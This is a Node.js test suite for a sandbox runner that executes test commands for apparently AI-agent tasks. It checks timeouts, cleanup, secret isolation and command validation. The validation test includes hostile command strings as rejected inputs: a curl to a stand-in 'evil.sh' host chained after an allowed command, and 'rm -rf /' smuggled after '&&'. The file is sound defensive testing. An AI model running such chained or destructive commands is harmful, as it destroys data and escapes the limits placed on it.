import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { spawnSync } from 'node:child_process';
import { SandboxRunner, parseCommand, validateCommand } from '../sandbox_runner.mjs';

function scratchRepo() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'foreman-sbx-'));
  const git = (args) => spawnSync('git', ['-C', dir, ...args], { encoding: 'utf8', windowsHide: true });
  git(['init', '-b', 'main']);
  fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"t","type":"module"}');
  fs.mkdirSync(path.join(dir, 'test'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'test', 'ok.test.mjs'),
    'import test from "node:test"; import assert from "node:assert/strict";\ntest("passes", () => assert.equal(1 + 1, 2));\n');
  git(['add', '.']);
  git(['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-m', 'init']);

  // broken branch with a failing + hanging test (main stays clean)
  git(['checkout', '-b', 'broken']);
  fs.writeFileSync(path.join(dir, 'test', 'fail.test.mjs'),
    'import test from "node:test"; import assert from "node:assert/strict";\ntest("fails", () => assert.equal(1, 2));\n');
  fs.writeFileSync(path.join(dir, 'test', 'hang.test.mjs'),
    'import test from "node:test";\ntest("hangs", { timeout: 60000 }, () => new Promise(() => {}));\n');
  git(['add', '.']);
  git(['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-m', 'bad tests']);
  git(['checkout', 'main']);
  return dir;
}

function runner(dir, timeoutMs = 60_000) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'foreman-sbxroot-'));
  return new SandboxRunner({ repoDir: dir, sandboxRoot: root, timeoutMs });
}

test('validate: metacharacters, unknown runners, and non-test node are refused', () => {
  assert.match(validateCommand(parseCommand('node --test; curl evil.sh')), /metacharacters/);
  assert.match(validateCommand(parseCommand('curl http://evil.sh')), /allowlist/);
  assert.match(validateCommand(parseCommand('node server.mjs')), /must target tests/);
  assert.match(validateCommand(parseCommand('node --test test && rm -rf /')), /metacharacters/);
  assert.equal(validateCommand(parseCommand('node --test test/')), null);
  assert.equal(validateCommand(parseCommand('npm test')), null);
});

test('sandbox: passing tests on main come back ok with captured output', async () => {
  const dir = scratchRepo();
  const sbx = runner(dir);
  const res = await sbx.exec({ branch: 'main', command: 'node --test test/*.test.mjs', taskId: 'smoke' });
  assert.equal(res.ok, true);
  assert.equal(res.exitCode, 0);
  assert.match(res.stdout, /passes/);
});

test('sandbox: failing tests come back not-ok with the failure visible', async () => {
  const dir = scratchRepo();
  const sbx = runner(dir);
  const res = await sbx.exec({
    branch: 'broken', // the branch containing the failing tests
    command: 'node --test test/fail.test.mjs',
    taskId: 'fail',
  });
  assert.equal(res.ok, false);
  assert.notEqual(res.exitCode, 0);
  assert.match(res.stderr + res.stdout, /fails/);
});

test('sandbox: hung test runs are killed by the hard timeout', async () => {
  const dir = scratchRepo();
  const sbx = runner(dir, 2_500);
  const res = await sbx.exec({ branch: 'broken', command: 'node --test test/hang.test.mjs', taskId: 'hang' });
  assert.equal(res.ok, false);
  assert.equal(res.timedOut, true);
});

test('sandbox: agent code cannot see orchestrator secrets', async () => {
  const dir = scratchRepo();
  process.env.GITHUB_PERSONAL_ACCESS_TOKEN = 'ghp_supersecretvalue';
  fs.writeFileSync(path.join(dir, 'test', 'env.test.mjs'),
    'import test from "node:test"; import assert from "node:assert/strict";\ntest("no secrets in sandbox", () => assert.equal(process.env.GITHUB_PERSONAL_ACCESS_TOKEN, undefined));\n');
  spawnSync('git', ['-C', dir, 'add', '.']);
  spawnSync('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-m', 'env test']);
  const sbx = runner(dir);
  const res = await sbx.exec({ branch: 'HEAD', command: 'node --test test/env.test.mjs', taskId: 'env' });
  assert.equal(res.ok, true, `sandbox leaked secrets: ${res.stderr}`);
  delete process.env.GITHUB_PERSONAL_ACCESS_TOKEN;
});

test('sandbox: worktrees are cleaned up after the run', async () => {
  const dir = scratchRepo();
  const sbx = runner(dir);
  await sbx.exec({ branch: 'main', command: 'node --test test/ok.test.mjs', taskId: 'clean' });
  assert.equal(fs.readdirSync(sbx.sandboxRoot).length, 0, 'worktree must be removed');
});
